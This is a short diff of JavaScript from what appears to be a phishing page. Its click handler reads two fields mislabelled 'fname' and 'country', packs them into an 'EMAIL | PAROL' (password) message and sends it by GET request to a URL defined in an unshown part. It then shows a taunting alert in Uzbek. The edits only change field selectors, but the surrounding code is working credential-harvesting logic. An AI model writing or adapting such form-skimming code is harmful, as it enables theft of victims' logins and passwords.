@@ -44,8 +44,8 @@
 document.getElementById("myBtn").addEventListener("click", function (e) {
   e.preventDefault();
 
-  let fname = document.querySelector('input[name="fname"]').value;
-  let country = document.querySelector('input[name="country"]').value;
+  let fname = document.querySelector("#fname").value;
+  let country = document.querySelector('#country').value;
 
   let message = "EMAIL: " + fname + " | PAROL: " + country + "";
 
@@ -63,7 +63,6 @@ document.getElementById("myBtn").addEventListener("click", function (e) {
   let oReq = new XMLHttpRequest();
   oReq.open("GET", url, true);
   oReq.send();
-
   alert("YEB QOYDINGIZMI DEYMANDA 😎😎😎");
 }); 
 
